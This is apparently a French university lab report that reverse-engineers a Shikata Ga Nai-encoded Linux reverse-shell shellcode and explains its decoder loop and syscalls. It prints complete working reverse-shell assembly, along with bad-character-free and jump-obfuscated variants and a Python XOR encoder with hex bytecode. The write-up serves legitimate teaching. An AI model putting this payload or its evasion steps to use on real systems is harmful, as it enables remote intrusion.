# SLB Labo3

Authors : Amir Mouti - Nathan Rayburn - Ouwies Harun 

## Table of Contents

- [SLB Labo3](#slb-labo3)
  - [Authors | Amir Mouti - Nathan Rayburn - Ouwies Harun](#authors--amir-mouti---nathan-rayburn---ouwies-harun)
  - [QUESTION 2.1](#question-21)
  - [QUESTION 3.1](#question-31)
  - [QUESTION 3.2](#question-32)
  - [QUESTION 3.3](#question-33)
  - [QUESTION 3.4](#question-34)
  - [QUESTION 3.5](#question-35)
  - [QUESTION 3.6](#question-36)
  - [QUESTION 3.7](#question-37)
  - [QUESTION 4.1](#question-41)
    - [socketcall](#socketcall)
    - [Dup2](#dup2)
    - [Execve](#execve)
  - [QUESTION 4.2](#question-42)
  - [QUESTION 5.1](#question-51)
  - [QUESTION 5.2](#question-52)
  - [QUESTION 5.3](#question-53)
  - [QUESTION 6.1 ( Bonus )](#question-61--bonus-)
  - [QUESTION 6.2 ( Bonus )](#question-62--bonus-)
  - [QUESTION 6.3 ( Bonus )](#question-63--bonus-)


## QUESTION 2.1
**Que remarquez-vous d’inhabituel dans les permissions attribuées aux principaux segments de shikata.elf. Quel lien voyez-vous avec l’obfuscation Shikata Ga Nai ?**

![alt text](https://hackmd.io/_uploads/Sk0MoNgvkx.png)

On a la permission write. C'est lié à shikata ga nai car on déchiffre les instructions pendant l'exécution, on a donc besoin de pouvoir écrire à cet endroit de la mémoire. Normalement, un programme ne modifie pas son code pendant l'exécution, c'est pour ça que c'est inhabituel.

## QUESTION 3.1
**Que font les instructions correspondant aux 8 premiers bytes (2 premiers mots) déchiffrés ? Font-elles partie du shellcode ?**


Instructions déchiffrées (les adresses des instructions qui vont changer sont surlignées dans les screenshots):

4 premiers bytes changés (première itération):

![alt text](https://hackmd.io/_uploads/ryAfi4gw1l.png)

![alt text](https://hackmd.io/_uploads/S1AGsElvyx.png)

4 bytes suivants (deuxième itération):

![alt text](https://hackmd.io/_uploads/r10zi4gDJx.png)

![alt text](https://hackmd.io/_uploads/ByAfsNewye.png)


Instructions déchiffrées:
```asm
   0x804806a:	add    edx,DWORD PTR [esi+0xe]
   0x804806d:	loop   0x8048064
   0x804806f:	xor    eax,eax
   0x8048071:	mov    al,0x66
```

Les deux premières instructions ne font pas partie du shellcode, elles font partie du code qui déchiffre le code. La première ligne met la clé de déchiffrement à jour et la seconde fait une boucle pour retourner à l'instruction xor (pour continuer à déchiffrer le code). Comme vu dans les slides:

![alt text](https://hackmd.io/_uploads/HkJXsElPyl.png)

Les deux instructions suivantes mettent eax à 0 puis y mettent 0x66. Comme elles sont après le "loop" elles font probablement partie du shellcode (hypothèse: ça pourrait être l'ID d'un syscall qu'on met dans eax).

## QUESTION 3.2
**Qu'observez-vous comme différence en posant un hardware breakpoint plutôt qu'un breakpoint tout simple après la boucle de déchiffrement ? Qu'en déduisez-vous sur GDB?**

Hardware breakpoint:

![alt text](https://hackmd.io/_uploads/By1XiExw1l.png)

Breakpoint normal:

![alt text](https://hackmd.io/_uploads/rkJ7iVlvkl.png)

On voit qu'avec un hardware breakpoint le déchiffrement c'est passé normalement alors qu'avec un breakpoint normal, l'instruction à l'adresse du breakpoint n'est pas la bonne. 

Si on regarde l'instruction plus en détail:

hardware breakpoint:
![alt text](https://hackmd.io/_uploads/B16GoVevyg.png)

breakpoint normal:
![alt text](https://hackmd.io/_uploads/H10GiVxDJl.png)

On voit qu'avec le breakpoint normal, le byte à l'adresse du breakpoint (0x804806f) n'a pas été modifié alors que le byte suivant est le bon. C'est le même 09 qu'on voit dans le code Ghidra à l'endroit surligné: 

![alt text](https://hackmd.io/_uploads/By0zi4ePJg.png)

En cherchant sur internet, on a vu que les breakpoints normaux sont implémentés en changeant une instruction en une interruption ce qui fait que lorsqu'on l'atteint, le programme est stoppé pour le debugger alors que les breakpoints hardware utilisent les fonctions du hardware pour comparer les adresses des instructions et stope le programme quand l'adresse est atteinte.

On comprend donc que le breakpoint normal empêche le code d'être déchiffré car on remplace une instruction par un interrupt et l'instruction qui était à cet adresse n'est plus présente pour être déchiffrée pendant l'exécution.

## QUESTION 3.3
**Avec combien d’itérations de Shikata Ga Nai le binaire a-t-il été obfusqué ?**

Une seule. On le sait car une fois qu'on est sorti de la loop de déchiffrement, il n'y a pas un autre préambule de Shikata Ga Nai (une autre boucle de déchiffrement):

![alt text](https://hackmd.io/_uploads/H1k7oExw1x.png)

## QUESTION 3.4
**Quel préambule avez-vous obtenu pour la première itération (code assembleur avec adresse mémoire de chaque instruction) ?**

Comme vu dans le screenshot à la question précédente:

```
   0x8048059:	ffree  st(6)
   0x804805b:	fnstenv [esp-0xc]
   0x804805f:	pop    esi
   0x8048060:	xor    ecx,ecx
   0x8048062:	mov    cl,0x19
   0x8048064:	xor    DWORD PTR [esi+0x12],edx
   0x8048067:	add    esi,0x4
   0x804806a:	add    edx,DWORD PTR [esi+0xe]
   0x804806d:	loop   0x8048064
```

Normalement il y a un mov dans EDX pour initialiser la clé au début qu'on peut voir si on met un breakpoint à l'adresse 0x8048054:

```
   0x8048054:	mov    edx,0x4f71e0e2
```

![alt text](https://hackmd.io/_uploads/HJkQjVxPke.png)

Mais comme on le voit dans le screenshot de la question précédente, gdb nous montre une autre instruction à la place (qui ne commence un byte plus tôt que le mov):

```
   0x8048053:	add    BYTE PTR [edx+0x4f71e0e2],bh
```


## QUESTION 3.5
**A quoi sert l’instruction fnstenv dans le préambule ? Pourquoi est-elle utilisée ?**

Elle sauvegarde l'état du FPU à l'endroit en mémoire donné en argument. Cet état comprend entre autre l'Instruction Pointer. 

Shikata Ga Nai utilise cette instruction pour stocker la valeur de EIP dans ESI en sauvegardant l'état du FPU dans la stack puis en faisant un POP dans ESI avec l'instruction suivante.

## QUESTION 3.6
**A quoi sert le registre ecx qui est utilisé dans le préambule ?**

Il sert de compteur pour la boucle. Il est initialisé à 0x19 et on peut voir dans gdb qu'il est décrémenté à chaque itération.

## QUESTION 3.7
**Expliquez les opérations de déchiffrements sur les 2 premiers mots mémoire du shellcode (opérations de déchiffrement, instructions assembleur résultantes).**


Boucle de déchiffrement:

```
   0x8048064:	xor    DWORD PTR [esi+0x12],edx
   0x8048067:	add    esi,0x4
   0x804806a:	add    edx,DWORD PTR [esi+0xe]
   0x804806d:	loop   0x8048064
```

Le déchiffrement est un simple xor sur un mot mémoire de 4 bytes (esi contient le pointeur sur le code à déchiffrer, edx contient la clé de déchiffrement):

```
   0x8048064:	xor    DWORD PTR [esi+0x12],edx
```

Ensuite on avance le pointeur de 4 bytes pour passer au mot suivant et on met à jour la clé (addition de la clé avec le mot déchiffré):

```
   0x8048067:	add    esi,0x4
   0x804806a:	add    edx,DWORD PTR [esi+0xe]
```

Les deux premiers mots mémoires du shellcode qu'on obtient sont:

```asm
   0x804806f:	xor    eax,eax
   0x8048071:	mov    al,0x66
   0x8048073:	xor    ebx,ebx
   0x8048075:	mov    bl,0x1
```

## QUESTION 4.1
**Expliquez pour chaque appel système, son utilité, ses arguments, leurs valeurs et comment ils lui sont passés. Aidez-vous de la « linux system call table »**

Le shellcode fait ces syscalls:

| Syscall        | ID         |
|------------    |------------|
| sys_socketcall | 0x66 = 102 |
| sys_dup2       | 0x3f = 63  |
| sys_execve     | 0xb = 11   |

Les syscalls sont appelés en mettant leur ID dans eax et en lançant un interrupt

### socketcall

Socketcall est un point d'entrée pour les appels système liés aux sockets. Le paramètre call définit l'appel et le pointeur args pointe vers les arguments du syscall correspondant. 

**sys_socketcall**
| args                     | register   |
|------------              |------------|
| int call                 | ebx        |
| unsigned long user \*args| ecx        |

Les arguments lui sont passé dans les registres ebx et ecx. Pour le pointeur args, les arguments du syscall qu'on veut vraiment appeler sont push sur la stack et on met ESP dans ECX.

Extrait du code qui fait le premier appel socketcall:
```
        xor eax, eax
        mov al, 0x66    ; socketcall
        xor ebx, ebx
        mov bl, 0x1     ; bl <- arg: int call (1 indique un appel socket)
        xor ecx, ecx
        push ecx        ; stack <- troisième arg de socket
        push 0x1        ; stack <- deuxième arg de socket
        push 0x2        ; stack <- premier arg de socket
        mov ecx, esp    ; ecx <- arg: unsigned long user *args
        int 0x80
```

Cet appel de socketcall revient à faire un appel de `int socket(int domain, int type, int protocol);`

L'appel de socket va créer un socket actif et retourner le file descriptor du socket. Ce socket est un socket actif qui va se connecter à une adresse et port donné.

Les arguments sont:

| arguments de socketcall  | value      |
|------------              |------------|
| int call                 | 1 => indique un appel socket|
| unsigned long user \*args| pointeur vers args de socket|

| arguments de socket   | value      |
|------------           |------------|
| int domain            | 2 => (AF_INET) indique qu'on utilise des adresses IPv4|
| int type              | 1 => (SOCK_STREAM) indique que le type de connection et des bytes streams entrant et sortant|
| int protocol          | 0 => prend le protocole par défaut pour la communication (avec ces params, ce sera TCP)|


Extrait du code qui fait le deuxième appel socketcall:
```
        xor edx, edx
        mov edx, eax       ; edx <- sockfd
        mov al, 0x66       ; socketcall
        mov bl, 0x3        ; bla <- arg: int call (indique un appel connect)
        xor ecx, ecx       
        push 0x0100007f    ; stack <- ip 127.0.0.1
        push word 0xfb20   ; stack <- port 8443
        push word 0x2      ; stack <- 2 = AF_INET (indique qu'on utilise IPv4)
        mov esi, esp       ; esi <- esp (sockaddr *addr)
        push 0x10          ; stack <- troisième arg de connect (taille de struct sockaddr)
        push esi           ; stack <- deuxième arg de connect (sockaddr *addr)
        push edx           ; stack <-premier arg de connect (sockfd)
        mov ecx, esp       ; ecx <- arg: pointeur vers les arguments de connect
        int 0x80
```

Cet appel de socketcall revient à faire un appel de `int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen);`

Connect va connecter le socket correspondant au file descriptor passé en paramètre à l'adresse décrite dans la struct sockaddr.

Les arguments sont:

| arguments de socketcall  | value      |
|------------              |------------|
| int call                 | 3 => indique un appel connect|
| unsigned long user \*args| pointeur vers args de connect|

| arguments de connect         | value      |
|------------                 |------------|
| int sockfd                  | sortie du syscall précédent (socket) |
| const struct sockaddr \*addr | pointeur vers la struct |
| socklen_t addrlen           | 16 |

La struct sockaddr va indiquer l'adresse ip et le port auquel on se connecte: `127.0.0.1:8443`

### Dup2

Dup2 est utilisé ici pour rediriger les entrées-sorties vers le socket.
Les arguments sont passés dans les registres ebx et ecx.

**premier appel sys_dup2**
| args                     | register   | value     |
|------------              |------------|-----------|
| unsigned int oldfd       | ebx        | sockfd    |
| unsigned int newfd       | ecx        | 0 = stdin |

extrait du code assembleur:
```
        mov al, 0x3f    ; dup2        
        mov ebx, edx    ; ebx <- sockfd    
        xor ecx, ecx    ; ecx <- 0 (stdin)
        int 0x80
```

Cet appel permet de traiter ce qu'on reçoit de la connection socket comme des entrées de stdin.

**deuxième appel sys_dup2**
| args                     | register   | value     |
|------------              |------------|-----------|
| unsigned int oldfd       | ebx        | sockfd    |
| unsigned int newfd       | ecx        | 1 = stdout|

extrait du code assembleur:
```
        mov al, 0x3f    ; dup2     
        mov cl, 0x1     ; cl <- 1 (stdout)
        int 0x80
```

Cet appel permet de rediriger l'output du terminal stdout et de les envoyer à travers la connection du socket

**troisième appel sys_dup2**
| args                     | register   | value     |
|------------              |------------|-----------|
| unsigned int oldfd       | ebx        | sockfd    |
| unsigned int newfd       | ecx        | 2         |

extrait du code assembleur:
```
        mov al, 0x3f    ; dup2      
        mov cl, 0x2     ; cl <- 2 (stderr)
        int 0x80
```

Cet appel permet de rediriger les messages d'erreur du terminal (stderr) et de les envoyer à travers la connection du socket

### Execve

`int execve(const char *pathname, char *const _Nullable argv[],
                  char *const _Nullable envp[]);`

Execve exécute le programme référencé par le pathname passé en argument. Les arguments sont passés dans `ebx`, `ecx` et `edx`.

**sys_execve**
| args                              | register   | value     |
|------------                       |------------|-----------|
| const char user \*filename        | ebx        |  esp      |
|const char user \*const user \*argv|ecx         |  0     |
|const char user \*const user \*envp|edx         |  0     |

```c 
execve("//bin/sh",0,0)
```

Cet appel ouvre un shell. Avec les dup2 et le socket effectués avant, ça permet d'ouvrir un shell qui est controllé à travers la connection du socket (fait un reverse shell).

Extrait du code:
```
        xor eax, eax
        mov al, 0xb     ; syscall execve
        xor ebx, ebx
        push ebx        ;  stack <- "\0"
        push 0x68732f6e ;  stack <- n/sh
        push 0x69622f2f ;  stack <- //bi
        mov ebx, esp    ;  ebx <- pointeur vers "//bin/sh"
        xor ecx, ecx    ;  ecx <- 0 (nullptr)
        xor edx, edx    ;  edx <- 0 (nullptr)
        int 0x80
```

## QUESTION 4.2
**Que fait le shellcode ?**

Le shellcode crée un socket, se connecte à `127.0.0.1:8443` et ensuite redirige les entrées sorties du terminal vers la connection et ouvre un shell. 

Ca permet d'avoir un reverse shell.

## QUESTION 5.1
**Comment pouvez-vous utiliser le shellcode shikata.elf ?**


On doit ouvrir un socket passif qui écoute avec le port et l'adresse IP spécifiés dans le shellcode. Normalement ça serait sur une machine distante de l'attaquant pour avoir un reverse shell mais comme shikata.elf se connecte sur `127.0.0.1`, on le fait sur la même machine.

On peut ouvrir un socket passif avec netcat. Ensuite, on exécute shikata.elf dans un autre terminal.

Exemple d'exécution:

![image](https://hackmd.io/_uploads/Hy8K8NVvJl.png)

Si on veut faire un reverse shell à distance, il faudrait alors changer l'adresse IP dans le shellcode et faire attention aux bytes qui peuvent casser la lecture/écriture du shellcode pendant une injection.

( Il faudrait également faire attention au port forwarding ainsi qu'à d'autres cas éventuels si l'on sort du réseau pour établir une connexion à distance. )

## QUESTION 5.2
**Quelles modifications avez-vous du apporter à votre shellcode ?**

On a modifié les parties du code qui push l'adresse IP et le port sur la pile ainsi que l'instruction qui met le code correspondant à l'appel execve dans eax à cause de bytes qui peuvent casser le code pendant la lecture/écriture du shellcode. L'adresse IP avait des `0x00`, le port avait un `0x20` et le `mov al, 0xb` a le byte `0x0B`.

Code changé shellcode_fix.asm :

```assembly
        xor eax, eax
        mov al, 0x66
        xor ebx, ebx
        mov bl, 0x1
        xor ecx, ecx
        push ecx    
        push 0x1        
        push 0x2        
        mov ecx, esp
        int 0x80
        xor edx, edx
        mov edx, eax
        mov al, 0x66    
        mov bl, 0x3
        mov ecx, 0x1110106F ; ecx <- Masked IP address
        xor ecx, 0x10101010 ; apply mask to get the IP
        push ecx            ; stack <- 127.0.0.1
        xor ecx, ecx    
        mov cx, 0xfa21      ; cx <- Masked port
        xor cx, 0x0101      ; apply mask to get the port
        push cx             ; stack <- 8443
        xor ecx, ecx       
        push word 0x2           
        mov esi, esp           
        push 0x10              
        push esi               
        push edx                
        mov ecx, esp
        int 0x80
        mov al, 0x3f            
        mov ebx, edx            
        xor ecx, ecx
        int 0x80
        mov al, 0x3f            
        mov cl, 0x1
        int 0x80
        mov al, 0x3f           
        mov cl, 0x2
        int 0x80
        xor eax, eax
        mov al, 0x8         ; al <- masked 0xb
        xor al, 0x3         ; apply mask to get 0xb (execve)
        xor ebx, ebx
        push ebx                    
        push 0x68732f6e
        push 0x69622f2f
        mov ebx, esp
        xor ecx, ecx
        xor edx, edx
        int 0x80
```



On voit sur ce screenshot que le code modifié ainsi marche toujours de la même manière mais on n'a plus de bytes qui risquent de casser le shellcode pendant une injection:

![image](https://hackmd.io/_uploads/BkIhWV4wJx.png)


## QUESTION 5.3
**Le comportement du shellcode a-t-il dû être modifié ? Comment ?**

Le comportement du shellcode a dû être modifié: il faut faire des opérations sur les paramètres afin d'obtenir les mêmes valeurs sans qu'elles apparaissent directement dans le code assembleur car elles contiennent des bytes qui peuvent empêcher la copie du shellcode pendant une injection. 

Au lieu de push directement les valeurs sur la pile, nous mettons dans un registre les valeurs masquées avec un masque choisi pour que ni la valeur ni le masque n'aient de bytes interdits. Ensuite nous appliquons une deuxième le masque avec un xor, ce qui permet de retrouver la valeur initiale souhaitée. 

Dans le code (shellcode_fix.asm):

```assembly
        ...
        
        mov ecx, 0x1110106F ; Masked addr.
        xor ecx, 0x10101010 ; remove mask
        push ecx
        xor ecx, ecx    
        mov cx, 0xfa21      ; Masked port
        xor cx, 0x0101      ; remove mask
        push cx
        ... 
        
        xor eax, eax
        mov al, 0x8        ; mask 0xb
        xor al, 0x3        ; calculate 0xb
        ...
```

Pour les arguments mis dans la pile, deux instructions sont ajoutées, un mov et un xor. Pour l'ID de execve, la valeur doit se retrouver dans eax, on a besoin que d'ajouter une instruction pour appliquer le masque.

## QUESTION 6.1 ( Bonus )
**Quelle obfuscation du cours avez-vous choisie ? Montrez l’effet sur le code obfusqué et expliquez en quoi elle peut compliquer le reverse.**

Obfuscation choisie: Sauts arbitraires (slide 50)

Code obfusqué (obf_shellcode.asm):
Le code est le même 
```
        xor eax, eax
        jmp L55
        
        L7:xor ecx, 0x10101010 ; apply mask to get the IP
        push ecx            ; stack <- 127.0.0.1
        jmp L6
        
        LBOZO:
        push 0x1        
        push 0x2        
        mov ecx, esp
        int 0x80
        xor edx, edx
        mov edx, eax
        mov al, 0x66    
        jmp L1
        
        king:mov al, 0x3f            
        mov ebx, edx            
        xor ecx, ecx
        int 0x80
        mov al, 0x3f            
        mov cl, 0x1
        jmp loop
        
        L2:mov cx, 0xfa21      ; cx <- Masked port
        xor cx, 0x0101      ; apply mask to get the port
        push cx             ; stack <- 8443
        xor ecx, ecx       
        push word 0x2           
        mov esi, esp           
        push 0x10              
        push esi               
        push edx                
        mov ecx, esp
        int 0x80
        jmp king
        
        loop:int 0x80
        mov al, 0x3f           
        mov cl, 0x2
        int 0x80
        xor eax, eax
        mov al, 0x8         ; al <- masked 0xb
        xor al, 0x3         ; apply mask to get 0xb (execve)
        xor ebx, ebx
        push ebx                    
        push 0x68732f6e
        push 0x69622f2f
        jmp L3
        
        L1:mov bl, 0x3
        mov ecx, 0x1110106F ; ecx <- Masked IP address
        jmp L7

        L6:xor ecx, ecx    
        jmp L2
        
        L55:mov al, 0x66
        xor ebx, ebx
        mov bl, 0x1
        xor ecx, ecx
        push ecx
        jmp LBOZO
        
        L3:mov ebx, esp
        xor ecx, ecx
        xor edx, edx
        int 0x80
```

Cette technique complique le reverse car quelqu'un qui essaie de comprendre ce que le programme fait en lisant le code assembleur va devoir suivre les sauts qui vont dans tous les sens et risque de perdre le fil.


## QUESTION 6.2 ( Bonus )
**A quoi devez-vous faire attention lors du choix de la clé XOR ?**

Il faut faire attention à ce que le résultat du shellcode xoré n'ait pas de byte qui pourrait casser la lecture/écriture du shellcode (`0x00`, `0x09`, `0x0A`, `0x0B`, `0x0C`, `0x0D`, `0x20`). Il faut aussi que la clé qui va décoder le code n'en aie pas non plus car elle apparaîtra dans le préambule qui va décoder le code. 

Sinon, si la clé a un des bytes interdits, il faut utiliser la même technique qu'à la question 5.2 en mettant d'abord une valeur qui n'a pas un de ces bytes dans un registre puis effectuer une opération dessus qui donne la clé.

## QUESTION 6.3 ( Bonus )
**Expliquez les lignes principales du code de votre script python.**

Script xor_bytecode.py:

```python=
def xor_bytecode(bytecode: str) -> tuple:
    # Liste des bytes indésirables
    forbidden_bytes = {0x00, 0x09, 0x0A, 0x0B, 0x0C, 0x0D, 0x20}
    
    # Convertir la chaîne hexadécimale en une liste de bytes
    bytes_array = bytes.fromhex(bytecode)
    
    # Tester tous les bytes possibles pour le XOR
    for xor_value in range(1, 256):
        # Vérifier si le byte XOR lui-même est interdit
        if xor_value in forbidden_bytes:
            continue
        
        # XOR chaque byte du bytecode avec la valeur actuelle
        xored_bytes = [b ^ xor_value for b in bytes_array]
        
        # Vérifier si un byte XORé est interdit
        if all(b not in forbidden_bytes for b in xored_bytes):
            # Formater le résultat avec \x devant chaque byte
            formatted_result = ''.join(f'\\x{b:02x}' for b in xored_bytes)
            return formatted_result, xor_value
    
    # Si aucun XOR valide n'est trouvé
    raise ValueError("Aucune combinaison XOR valide n'a été trouvée.")

# bytecode à xorer
bytecode = "31c0eb6d81f11010101051eb606a016a0289e1cd8031d289c2b066eb47b03f89d331c9cd80b03fb101eb1c66b921fa6681f10101665131c9666a0289e66a10565289e1cd80ebd6cd80b03fb102cd8031c0b008340331db53686e2f7368682f2f6269eb18b303b96f101011eb9731c9ebbab06631dbb30131c951eb9189e331c931d2cd80"

try:
    result, xor_value = xor_bytecode(bytecode)
    print(f"Bytecode XORé : {result}")
    print(f"Byte XOR utilisé : 0x{xor_value:02x}")
except ValueError as e:
    print("Erreur :", e)

```

Ce script prend un bytecode dans la variable du même nom. Ce bytecode est obtenu avec la commande 

```sh
objdump -d obf_shellcode | grep '^[[:space:]]*[0-9a-f]*:' | awk '{for(i=2;i<=NF && $i ~ /^[0-9a-f]+$/; i++) printf $i; print ""}' | tr -d '\n' > bytecode.txt
```

dans un terminal (obf_shellcode est le shellcode compilé).

Le script va itérer sur toutes les valeurs possible d'un byte et xor le bytecode entier byte par byte avec cette clé et formatte les bytes pour qu'ils commencent par \x. 

Si le résultat n'a pas de byte interdit, il print le bytecode obtenu et la clé utilisée.

Il faudrait encore ajouter un préambule qui décode le shellcode à l'exécution pour que le payload soit prêt à être utilisé.
